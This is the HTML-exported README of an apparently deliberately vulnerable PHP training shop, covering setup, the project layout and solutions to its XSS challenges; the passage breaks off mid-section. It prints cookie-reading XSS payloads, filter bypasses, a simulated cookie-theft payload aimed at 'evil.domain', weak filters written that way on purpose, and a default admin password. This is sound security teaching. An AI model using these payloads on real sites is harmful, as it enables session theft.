<!DOCTYPE html><html><head>
      <title>shop</title>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      
      <link rel="stylesheet" href="file:////Users/collins/.vscode/extensions/shd101wyy.markdown-preview-enhanced-0.5.13/node_modules/@shd101wyy/mume/dependencies/katex/katex.min.css">
      
      
      
      
      
      
      
      
      
      <style>
      /**
 * prism.js Github theme based on GitHub's theme.
 * @author Sam Clarke
 */
code[class*="language-"],
pre[class*="language-"] {
  color: #333;
  background: none;
  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
  text-align: left;
  white-space: pre;
  word-spacing: normal;
  word-break: normal;
  word-wrap: normal;
  line-height: 1.4;

  -moz-tab-size: 8;
  -o-tab-size: 8;
  tab-size: 8;

  -webkit-hyphens: none;
  -moz-hyphens: none;
  -ms-hyphens: none;
  hyphens: none;
}

/* Code blocks */
pre[class*="language-"] {
  padding: .8em;
  overflow: auto;
  /* border: 1px solid #ddd; */
  border-radius: 3px;
  /* background: #fff; */
  background: #f5f5f5;
}

/* Inline code */
:not(pre) > code[class*="language-"] {
  padding: .1em;
  border-radius: .3em;
  white-space: normal;
  background: #f5f5f5;
}

.token.comment,
.token.blockquote {
  color: #969896;
}

.token.cdata {
  color: #183691;
}

.token.doctype,
.token.punctuation,
.token.variable,
.token.macro.property {
  color: #333;
}

.token.operator,
.token.important,
.token.keyword,
.token.rule,
.token.builtin {
  color: #a71d5d;
}

.token.string,
.token.url,
.token.regex,
.token.attr-value {
  color: #183691;
}

.token.property,
.token.number,
.token.boolean,
.token.entity,
.token.atrule,
.token.constant,
.token.symbol,
.token.command,
.token.code {
  color: #0086b3;
}

.token.tag,
.token.selector,
.token.prolog {
  color: #63a35c;
}

.token.function,
.token.namespace,
.token.pseudo-element,
.token.class,
.token.class-name,
.token.pseudo-class,
.token.id,
.token.url-reference .token.variable,
.token.attr-name {
  color: #795da3;
}

.token.entity {
  cursor: help;
}

.token.title,
.token.title .token.punctuation {
  font-weight: bold;
  color: #1d3e81;
}

.token.list {
  color: #ed6a43;
}

.token.inserted {
  background-color: #eaffea;
  color: #55a532;
}

.token.deleted {
  background-color: #ffecec;
  color: #bd2c00;
}

.token.bold {
  font-weight: bold;
}

.token.italic {
  font-style: italic;
}


/* JSON */
.language-json .token.property {
  color: #183691;
}

.language-markup .token.tag .token.punctuation {
  color: #333;
}

/* CSS */
code.language-css,
.language-css .token.function {
  color: #0086b3;
}

/* YAML */
.language-yaml .token.atrule {
  color: #63a35c;
}

code.language-yaml {
  color: #183691;
}

/* Ruby */
.language-ruby .token.function {
  color: #333;
}

/* Markdown */
.language-markdown .token.url {
  color: #795da3;
}

/* Makefile */
.language-makefile .token.symbol {
  color: #795da3;
}

.language-makefile .token.variable {
  color: #183691;
}

.language-makefile .token.builtin {
  color: #0086b3;
}

/* Bash */
.language-bash .token.keyword {
  color: #0086b3;
}

/* highlight */
pre[data-line] {
  position: relative;
  padding: 1em 0 1em 3em;
}
pre[data-line] .line-highlight-wrapper {
  position: absolute;
  top: 0;
  left: 0;
  background-color: transparent;
  display: block;
  width: 100%;
}

pre[data-line] .line-highlight {
  position: absolute;
  left: 0;
  right: 0;
  padding: inherit 0;
  margin-top: 1em;
  background: hsla(24, 20%, 50%,.08);
  background: linear-gradient(to right, hsla(24, 20%, 50%,.1) 70%, hsla(24, 20%, 50%,0));
  pointer-events: none;
  line-height: inherit;
  white-space: pre;
}

pre[data-line] .line-highlight:before, 
pre[data-line] .line-highlight[data-end]:after {
  content: attr(data-start);
  position: absolute;
  top: .4em;
  left: .6em;
  min-width: 1em;
  padding: 0 .5em;
  background-color: hsla(24, 20%, 50%,.4);
  color: hsl(24, 20%, 95%);
  font: bold 65%/1.5 sans-serif;
  text-align: center;
  vertical-align: .3em;
  border-radius: 999px;
  text-shadow: none;
  box-shadow: 0 1px white;
}

pre[data-line] .line-highlight[data-end]:after {
  content: attr(data-end);
  top: auto;
  bottom: .4em;
}html body{font-family:"Helvetica Neue",Helvetica,"Segoe UI",Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ul,html body>ol{margin-bottom:16px}html body ul,html body ol{padding-left:2em}html body ul.no-list,html body ol.no-list{padding:0;list-style-type:none}html body ul ul,html body ul ol,html body ol ol,html body ol ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;background-color:#f0f0f0;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:bold;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:bold}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em !important;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::before,html body code::after{letter-spacing:-0.2em;content:"\00a0"}html body pre>code{padding:0;margin:0;font-size:.85em !important;word-break:normal;white-space:pre;background:transparent;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;font-size:.85em !important;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:before,html body pre tt:before,html body pre code:after,html body pre tt:after{content:normal}html body p,html body blockquote,html body ul,html body ol,html body dl,html body pre{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body pre,html body code{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview .pagebreak,.markdown-preview .newpage{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center !important}.markdown-preview:not([for="preview"]) .code-chunk .btn-group{display:none}.markdown-preview:not([for="preview"]) .code-chunk .status{display:none}.markdown-preview:not([for="preview"]) .code-chunk .output-div{margin-bottom:16px}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0}@media screen and (min-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{font-size:14px !important;padding:1em}}@media print{html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,0.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{padding:0 1.6em;margin-top:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc li{margin-bottom:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{list-style-type:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% -  300px);padding:2em calc(50% - 457px -  150px);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
/* Please visit the URL below for more information: */
/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */

      </style>
    </head>
    <body for="html-export">
      <div class="mume markdown-preview  ">
      <h1 class="mume-header" id="websec-shop">WebSec Shop</h1>

<hr>
<p>This is a short summary of the most important points of the documentation for the WebSec Shop. The Docker environment and the test environment (Vagrant) are described in separat README files.</p>
<h2 class="mume-header" id="installation-and-setup">Installation and Setup</h2>

<ol>
<li>
<p>Setup the Docker environment with the <code>setup_docker.sh</code> script or follow the steps described in the Docker README manually.</p>
</li>
<li>
<p>Login with the default admin user:</p>
</li>
</ol>
<ul>
<li><strong>user</strong> <code>administrator</code></li>
<li><strong>password</strong> <code>dpbCpfcAqVHY3gYf</code></li>
</ul>
<ol start="3">
<li>
<p>Change the default password after your first login!</p>
</li>
<li>
<p>Choose your settings either in the admin area of the WebSec shop or edit them directly in the <code>config/settings.json</code> file. <em>(The difficulty of the challenges must be set <strong>before</strong> the first student logs in. Otherwise, every student has to reset their challenges in the menu manually in order to load the new challenge settings.)</em></p>
</li>
<li>
<p><strong>Optional</strong>: You can also create a user of your choice and later set the admin status via phpMyAdmin or the MySQL command line client:</p>
</li>
</ol>
<ul>
<li>Connect to the MySQL database</li>
</ul>
<pre data-role="codeBlock" data-info="shell" class="language-shell">$ docker <span class="token function">exec</span> -it <span class="token operator">&lt;</span>db_container_name<span class="token operator">&gt;</span> /bin/bash

$ mysql -u <span class="token operator">&lt;</span>dbUser<span class="token operator">&gt;</span> -p login
</pre><ul>
<li>The SQL query could look something like this:</li>
</ul>
<pre data-role="codeBlock" data-info="sql" class="language-sql"><span class="token keyword">UPDATE</span> users <span class="token keyword">SET</span> is_admin <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">WHERE</span> user_name <span class="token operator">=</span> <span class="token operator">&lt;</span>shopUser<span class="token operator">&gt;</span><span class="token punctuation">;</span>
</pre><h2 class="mume-header" id="project-structure">Project Structure</h2>

<p>This is an overview over the files and directories directly related to the WebSec Shop. The structure is based on the <a href="https://github.com/php-pds/skeleton">Standard PHP Package Skeleton</a>.</p>
<p>The figure below shows the structure of the main directory <strong>www/</strong> and the purpose and contents of each subdirectory.</p>
<pre data-role="codeBlock" data-info class="language-"><code>www/
&#x251C;&#x2500;&#x2500; bin/
&#x2502;   &#x2514;&#x2500;&#x2500; command line tools
&#x2502;
&#x251C;&#x2500;&#x2500; config/
&#x2502;   &#x2514;&#x2500;&#x2500; php configuration files
&#x2502;   &#x2514;&#x2500;&#x2500; shop settings file
&#x2502;
&#x251C;&#x2500;&#x2500; data/
&#x2502;   &#x2514;&#x2500;&#x2500; sqlite databases
&#x2502;   &#x2514;&#x2500;&#x2500; user input files
&#x2502;
&#x251C;&#x2500;&#x2500; docs/
&#x2502;   &#x2514;&#x2500;&#x2500; short documentation
&#x2502;
&#x251C;&#x2500;&#x2500; public/
&#x2502;   &#x2514;&#x2500;&#x2500; admin/
&#x2502;   &#x2502;   &#x2514;&#x2500;&#x2500; pages for the admin area and global settings
&#x2502;   &#x2502;
&#x2502;   &#x2514;&#x2500;&#x2500; assets/
&#x2502;   &#x2502;   &#x2514;&#x2500;&#x2500; CSS, JavaScript and images
&#x2502;   &#x2502;
&#x2502;   &#x2514;&#x2500;&#x2500; pma/
&#x2502;   &#x2502;   &#x2514;&#x2500;&#x2500; access to phpMyAdmin (optional)
&#x2502;   &#x2502;
&#x2502;   &#x2514;&#x2500;&#x2500; shop/
&#x2502;   &#x2502;   &#x2514;&#x2500;&#x2500; pages for the challenges
&#x2502;   &#x2502;
&#x2502;   &#x2514;&#x2500;&#x2500; user/
&#x2502;       &#x2514;&#x2500;&#x2500; pages for user settings
&#x2502;
&#x251C;&#x2500;&#x2500; src/
&#x2502;   &#x2514;&#x2500;&#x2500; includes/
&#x2502;   &#x2502;   &#x2514;&#x2500;&#x2500; include files
&#x2502;   &#x2514;&#x2500;&#x2500; php functions
&#x2502;
&#x251C;&#x2500;&#x2500; tests/
&#x2502;   &#x2514;&#x2500;&#x2500; php unit tests (PHPUnit)
&#x2502;
&#x2514;&#x2500;&#x2500; vendor
    &#x2514;&#x2500;&#x2500; dependencies (for PHPUnit)
</code></pre><h3 class="mume-header" id="bin">bin/</h3>

<p>Contains the command line tools for this project.</p>
<ul>
<li><strong><code>convert_md_to_html.sh</code></strong> Converts markdown files (like this one) to valid HTML for the <strong>docs/</strong> folder.</li>
<li><strong><code>get_docker_logs.sh</code></strong> Copies log files from the separat Docker containers into the <strong>bin/</strong> folder.</li>
</ul>
<h3 class="mume-header" id="config">config/</h3>

<p>Contains the configurations and settings for the shop.</p>
<ul>
<li>
<p><strong><code>config.php</code></strong> Stores important constants for the project (server name, paths etc.). Is effected by the <code>setup_docker.sh</code> script.</p>
</li>
<li>
<p><strong><code>db_login.php</code></strong> Contains the login credentials for the login database. Is also setup by the <code>setup_docker.sh</code> script.</p>
</li>
<li>
<p><strong><code>db_shop.php</code></strong> Contains the login credentials for the shop database. Is also setup by the <code>setup_docker.sh</code> script.</p>
</li>
<li>
<p><strong><code>settings.json</code></strong> Stores all settings for the shop. For a more detailed description see the paragraph <strong>Settings</strong>.</p>
</li>
</ul>
<h3 class="mume-header" id="data">data/</h3>

<p>Contains all user SQLite databases for the SQLi challenge and the user input JSON files.</p>
<p>On <strong>normal</strong> difficulty the databases are initialized with one table (users) that stores username, password, email, whish list and user status for every entry. The database is filled with a set of fake users and an entry for the corresponding student. The password that is displayed for the student is a random string.</p>
<p>On <strong>hard</strong> difficulty the databases are extended by a second table (premium_users) in which the premium user status is stored for every fake user and the student.</p>
<p>The databases are created during the registration process with the <code>create_sqli_db</code> function in <strong>src/websec_functions.php</strong>.</p>
<p>All user input related to the hacking challenges is stored in user specific JSON files, which are created when the user attempts a challenge for the first time. The user input in the JSON files is grouped by challenges.</p>
<h3 class="mume-header" id="docs">docs/</h3>

<p>Contains the README files for all project components as HTML documents. The HTML files can be generated automatically with the <code>convert_md_to_html.sh</code> script in <strong>bin/</strong> from the original markdown files.</p>
<h3 class="mume-header" id="public">public/</h3>

<p>This is the root directory for the apache web server. All files within this directory are accessible from the outside. The remaining files in <strong>www/</strong> must be explicitly loaded by a php file to be visible to the user.</p>
<p>The files for the registration and login system of the shop are directly located in the root directory.</p>
<p>The <code>.htaccess</code> file redirects the most common HTTP errors (400, 401, 402, 403, 404, 500) to custom error pages.</p>
<p>The <strong>admin/</strong> directory contains the restricted admin area. Here you can see and download the student results for the challenges, change global shop settings and access the phpMyAdmin site for the MySQL databases <em>(if enabled in the <code>docker-compose.yml</code>)</em>.</p>
<p>The index file in the <strong>pma/</strong> directory checks if a user is either an admin user or has a valid token in order to redirect only authorized requests to the <em>&quot;hidden&quot;</em> phpMyAdmin directory. (<em>hidden</em> means in this context a random string as name for the phpMyAdmin directory).<br>
This option is only relevant if phpMyAdmin and apache are installed in the same Docker container. Otherwise, phpMyAdmin can be accessed via an open port. For more information on this, see the Docker README.</p>
<p>All pages related to the shop system and the hacking challenges are located in the <strong>shop/</strong> directory.</p>
<p>The pages for the user settings and the local challenge settings are in the <strong>user/</strong> directory.</p>
<p>All assets files like JavaScript, CSS or images are stored in the <strong>assets/</strong> directory. Third party JavaScript or CSS files are stored separately in directories named &apos;vendor&apos;.</p>
<h3 class="mume-header" id="src">src/</h3>

<p>The <strong>src/</strong> directory contains all php functions relevant to the shop and the challenges. Depending on their domain, the functions are stored in different files each denoted with an appropriate prefix (<code>*_functions.php</code>).</p>
<p>The <strong>includes/</strong> directory includes various files; mainly repetitive content that is later loaded in by other php scripts. The files are separated in different groups by their prefixes.</p>
<h3 class="mume-header" id="tests">tests/</h3>

<p>Contains the <a href="https://phpunit.de/">PHPUnit</a> tests. This directory can be omitted in production.</p>
<h3 class="mume-header" id="vendor">vendor/</h3>

<p>All dependencies for the project are stored in this directory. Currently, only the PHPUnit module has any dependencies. Hence, this directory can also be omitted in production.</p>
<h2 class="mume-header" id="challenges">Challenges</h2>

<p>This is a short summary of the hacking challenges in the WebSec Shop and their solutions.</p>
<h3 class="mume-header" id="cross-site-scripting-reflective">Cross Site Scripting (Reflective)</h3>

<p>The reflective XSS challenge is located in the <code>overview.php</code> file.</p>
<p><strong>Challenge</strong>: The challenge is to abuse the product search field to read out the users own session ID that is stored in a cookie (XSS_YOUR_SESSION). The challenge is completed, if the user enters the cookie in the corresponding popup field.</p>
<p>The cookie is automatically generated during the user registration process and later set after the user logs in. The cookie is destroyed after the session ends and the user logs out.<br>
The popup containing the field to enter the solution is automatically shown to the user after a JavaScript dialog (<code>alert()</code>, <code>confirm()</code> or <code>prompt()</code>) has been used on the product search page. To achieve this, a script overrides every dialog with a custom function. The custom function displays the original dialog (the users XSS attack) followed by the popup to enter the cookie.</p>
<pre data-role="codeBlock" data-info="js" class="language-javascript"><span class="token comment">// temporarily override alert()</span>
<span class="token comment">// there are also variants for confirm() and prompt()</span>
<span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token keyword">var</span> _alertXSS <span class="token operator">=</span> window<span class="token punctuation">.</span>alert<span class="token punctuation">;</span>

    window<span class="token punctuation">.</span><span class="token function-variable function">alert</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token comment">// show the original alert content</span>
        <span class="token function">_alertXSS</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// show the popup to enter the solution</span>
        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">&apos;#xss-solution&apos;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">modal</span><span class="token punctuation">(</span><span class="token string">&apos;show&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</pre><p><strong>Solution</strong>: Since the search term is printed out to the page, a solution would be to use a JavaScript dialog to output the cookie property of the document. JavaScript code can be executed by adding <code>&lt;script&gt;</code> tags to the search term. A working example would look like this:</p>
<pre data-role="codeBlock" data-info="html" class="language-html"><span class="token comment">&lt;!-- could also be confirm(document.cookie) or prompt(document.cookie) --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</pre><p>Another approach would be to write the cookie directly to the page.</p>
<pre data-role="codeBlock" data-info="html" class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript">document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</pre><p><em>If the attack is not performed via a JavaScript dialog function, the user has the option to trigger the popup mentioned above manually. A button and a short self-explanatory text is shown, when the search field is used and the search term contains <code>document.cookie</code>.</em></p>
<p><strong>Difficulty</strong>: On hard difficulty the search term is filtered for <code>&lt;script&gt;</code> tags:</p>
<pre data-role="codeBlock" data-info="php" class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$difficulty</span> <span class="token operator">==</span> <span class="token double-quoted-string string">&quot;hard&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// filter all &apos;&lt;script&gt;&apos; tags (case insensitive)</span>
    <span class="token variable">$rawSearchTerm</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;&lt;script&gt;&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token variable">$rawSearchTerm</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/*
    * Alternative: filter only &apos;&lt;script&gt;&apos; and &apos;&lt;SCRIPT&gt;&apos; tags
    * str_replace(&quot;&lt;script&gt;&quot;,&quot;&quot;, $rawSearchTerm)
    * str_replace(&quot;&lt;SCRIPT&gt;&quot;,&quot;&quot;, $rawSearchTerm)
    * Solution for all browsers: &lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;
    */</span>
<span class="token punctuation">}</span>
</pre><p>The user has to circumvent this measure by using a different HTML tag that allows the execution of JavaScript. An example that works with all modern browsers would be the <code>&lt;img&gt;</code> tag:</p>
<pre data-role="codeBlock" data-info="html" class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span>javascript:alert(document.cookie)</span><span class="token punctuation">&gt;</span></span>
</pre><h3 class="mume-header" id="cross-site-scripting-stored">Cross Site Scripting (Stored)</h3>

<p>The stored XSS challenge is located in the <code>product.php</code> file.</p>
<p><strong>Challenge</strong>: In this challenge the user has to exploit a comment field on the product page. <em>(The product page and the comment section are identical for all products. Only the product information changes based on the <code>GET</code> variable in the URL.)</em> The comments are stored in a MySQL database. The task is to simulate a cookie stealing attack by showing a JavaScript dialog with the content <code>&apos;evil.domain/cookie.php?c=&apos; + document.cookie</code>. The challenge is completed, when the user <em>steals</em> a session of a fake user and adds a specific product to the shopping cart.</p>
<p>If the user enters the payload, the JavaScript dialog functions are overwritten and the content is send via AJAX Request to the file <code>post_handler.php</code>.</p>
<pre data-role="codeBlock" data-info="js" class="language-javascript"><span class="token comment">// override alert()</span>
<span class="token comment">// there are also variants for confirm() and prompt()</span>
window<span class="token punctuation">.</span><span class="token function-variable function">alert</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token keyword">var</span> request<span class="token punctuation">;</span>

    request <span class="token operator">=</span> $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">&quot;post_handler.php&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        storedXSSMessage<span class="token punctuation">:</span> message
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    request<span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">showSuccess</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    request<span class="token punctuation">.</span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">showError</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</pre><p>The message is validated by checking if it contains at least the elements &apos;evil&apos;, &apos;domain&apos;, &apos;cookie&apos; and &apos;document.cookie&apos; in any given order. After that, the user is shown a success or error message.</p>
<p>The success message is a JavaScript <code>confirm()</code> dialog that gives the user the option to <em>steal</em> the session of a fake user. In order to simulate this, a second cookie is set that triggers a &apos;Welcome Back, <em>fake user</em>&apos; popup and a function call to fill the shopping cart with a variety of products.<br>
The <code>check_stored_xss_challenge()</code> function is always called when the shop header is loaded on a page and checks if a certain product is added to the cart in order to successfully complete this challenge.</p>
<p><strong>Solution</strong>: To solve this challenge, the user has to display the payload on the product page. This could be done like this:</p>
<pre data-role="codeBlock" data-info="html" class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&apos;evil.domain/cookie.php?c=&apos;</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</pre><p><strong>Difficulty</strong>: On hard difficulty the <code>&lt;script&gt;</code> tags and the <code>alert()</code> function are filtered before a user comment is stored to the database.</p>
<pre data-role="codeBlock" data-info="php" class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$difficulty</span> <span class="token operator">==</span> <span class="token double-quoted-string string">&quot;hard&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token comment">// filter all &apos;&lt;script&gt;&apos; tags (case insensitive)</span>
    <span class="token variable">$filteredComment</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;&lt;script&gt;&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">&apos;userComment&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/*
    * Alternative: filter only &apos;&lt;script&gt;&apos; and &apos;&lt;SCRIPT&gt;&apos; tags
    * str_replace(&quot;&lt;script&gt;&quot;,&quot;&quot;, $rawSearchTerm)
    * str_replace(&quot;&lt;SCRIPT&gt;&quot;,&quot;&quot;, $rawSearchTerm)
